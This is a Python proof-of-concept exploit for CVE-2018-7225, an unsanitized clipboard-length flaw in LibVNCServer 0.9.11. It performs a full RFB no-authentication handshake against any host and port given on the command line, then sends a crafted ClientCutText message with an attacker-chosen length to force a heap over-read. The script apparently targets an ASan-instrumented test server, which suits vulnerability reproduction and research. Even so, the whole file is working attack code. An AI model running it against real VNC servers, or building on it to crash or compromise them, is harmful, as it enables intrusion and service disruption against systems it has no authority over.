#!/usr/bin/env python3
"""
PoC for CVE-2018-7225 - LibVNCServer 0.9.11 unsanitized clipboard length.

Performs a complete RFB 3.8 handshake (no-auth path), then sends a malicious
rfbClientCutText message (type=6) with length set to a value LARGER than the
actual bytes we transmit.

Wire layout of rfbClientCutTextMsg (rfbproto.h):
    byte 0:    type   = 6  (rfbClientCutText)
    byte 1:    pad1   = 0
    byte 2:    pad2   = 0
    byte 3:    pad3   = 0
    bytes 4-7: length = uint32 big-endian  (attacker-controlled)

The server does:
    str = malloc(length);
    rfbReadExact(cl, str, length);
    setXCutText(str, length, cl);

Because `length` is never bounded, the callback receives the raw attacker value.
Our custom server callback allocates SANE_MAX=32 bytes and ASan-poisons
bytes [32..length-1], then memcpy's `length` bytes from str — crossing the
poison boundary and triggering an ASan heap-buffer-overflow READ.

We send `length` = SANE_MAX + OVERREAD (e.g. 32 + 64 = 96 declared bytes)
but only transmit PAYLOAD_BYTES (96) of actual data so rfbReadExact() reads
exactly what we claim and passes all bytes to setXCutText.

Usage:
    python3 poc_cve_2018_7225.py <host> <port>
    python3 poc_cve_2018_7225.py 127.0.0.1 15902
"""

import socket
import struct
import sys
import time

# Must match server_cve_2018_7225.c SANE_MAX
SANE_MAX = 32
# Extra bytes beyond SANE_MAX that the over-read will consume
OVERREAD = 64
# Total declared length — must equal the bytes we actually send so
# rfbReadExact() returns without blocking, and all bytes reach setXCutText.
DECLARED_LEN = SANE_MAX + OVERREAD  # 96


def recv_exact(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError(f"Connection closed after {len(buf)}/{n} bytes")
        buf += chunk
    return buf


def do_rfb_handshake(sock: socket.socket) -> None:
    """
    Full RFB 3.8 handshake with security type None (no password).

    Server -> Client: "RFB 003.00x\\n"   (12 bytes, ProtocolVersion)
    Client -> Server: "RFB 003.008\\n"   (12 bytes)
    Server -> Client: [count][types...]  (security types list)
    Client -> Server: [1]               (choose type 1 = None)
    Server -> Client: [result u32]      (SecurityResult; 0 = OK)
    Client -> Server: [shared u8]       (ClientInit)
    Server -> Client: ServerInit        (width/height/pixfmt/nameLen/name)
    """
    # Step 1: receive server ProtocolVersion (12 bytes)
    server_version = recv_exact(sock, 12)
    print(f"[*] Server version: {server_version!r}")
    assert server_version.startswith(b"RFB 003."), f"Unexpected banner: {server_version!r}"

    # Step 2: send client ProtocolVersion (request 3.8)
    sock.sendall(b"RFB 003.008\n")
    print("[*] Sent: RFB 003.008")

    # Step 3: receive security types  [count u8][type u8 ...]
    count_byte = recv_exact(sock, 1)
    count = count_byte[0]
    if count == 0:
        reason_len = struct.unpack(">I", recv_exact(sock, 4))[0]
        reason = recv_exact(sock, reason_len)
        raise RuntimeError(f"Server error before security list: {reason!r}")

    sec_types = recv_exact(sock, count)
    print(f"[*] Security types ({count}): {list(sec_types)}")
    if 1 not in sec_types:
        raise RuntimeError(f"Security type None (1) not offered: {list(sec_types)}")

    # Step 4: choose security type 1 (None)
    sock.sendall(b"\x01")
    print("[*] Sent: security type 1 (None)")

    # Step 5: receive SecurityResult (u32 big-endian; 0 = OK)
    result = struct.unpack(">I", recv_exact(sock, 4))[0]
    print(f"[*] SecurityResult: {result}")
    if result != 0:
        raise RuntimeError(f"Security handshake failed, result={result}")

    # Step 6: send ClientInit (1 byte; shared=1)
    sock.sendall(b"\x01")
    print("[*] Sent: ClientInit shared=1")

    # Step 7: receive ServerInit
    # width(u16) height(u16) pixelFormat(16 bytes) nameLength(u32) name(...)
    server_init_hdr = recv_exact(sock, 24)
    width, height = struct.unpack(">HH", server_init_hdr[:4])
    name_len = struct.unpack(">I", server_init_hdr[20:24])[0]
    name = recv_exact(sock, name_len)
    print(f"[*] ServerInit: {width}x{height} name={name!r}")


def send_cuttext_trigger(sock: socket.socket) -> None:
    """
    Send the malicious rfbClientCutText message that triggers CVE-2018-7225.

    Header (8 bytes):
        u8  type   = 6   (rfbClientCutText)
        u8  pad1   = 0
        u8  pad2   = 0
        u8  pad3   = 0
        u32 length = DECLARED_LEN  (big-endian, attacker-controlled)

    Payload: exactly DECLARED_LEN bytes so rfbReadExact() completes and
    delivers all bytes to setXCutText(str, DECLARED_LEN, cl).

    The server's setXCutText callback allocates SANE_MAX bytes, poisons
    bytes [SANE_MAX..DECLARED_LEN-1], then memcpy's DECLARED_LEN bytes —
    crossing the ASan fence at byte SANE_MAX and aborting.
    """
    # Build exactly: type(1) + pad(3) + length(4) = 8 bytes
    # ">B3xI": u8 type, 3 pad bytes (x = zero pad), u32 length big-endian
    header = struct.pack(">B3xI", 6, DECLARED_LEN)

    # Payload: DECLARED_LEN bytes; fill with 'A's for visibility
    # (first SANE_MAX bytes land in the sane region; next OVERREAD bytes
    # trigger the over-read past the poison boundary)
    payload = b"A" * SANE_MAX + b"X" * OVERREAD
    assert len(payload) == DECLARED_LEN

    print(f"[*] Sending rfbClientCutText: type=6, length={DECLARED_LEN} "
          f"(SANE_MAX={SANE_MAX}, OVERREAD={OVERREAD})")
    print(f"[*] Header: {header.hex()}")
    print(f"[*] Payload: {len(payload)} bytes "
          f"({SANE_MAX} 'A' + {OVERREAD} 'X')")
    sock.sendall(header + payload)
    print("[*] Message sent — waiting for ASan abort in server...")


def main() -> None:
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print(f"[*] CVE-2018-7225 PoC targeting {host}:{port}")
    print("[*] Unsanitized msg.cct.length over-read via setXCutText (LibVNCServer 0.9.11)")
    print()

    with socket.create_connection((host, port), timeout=10) as sock:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            do_rfb_handshake(sock)
        except Exception as exc:
            print(f"[-] Handshake failed: {exc}")
            sys.exit(1)

        print()
        send_cuttext_trigger(sock)

        # Keep socket open ~3 s so the server completes its rfbReadExact()
        # and enters setXCutText before the connection drops.
        time.sleep(3)

    print()
    print("[*] Socket closed. Check 'docker logs <container>' for the ASan abort trace.")
    print("[*] Expected: heap-buffer-overflow READ at my_set_xcut_text")


if __name__ == "__main__":
    main()
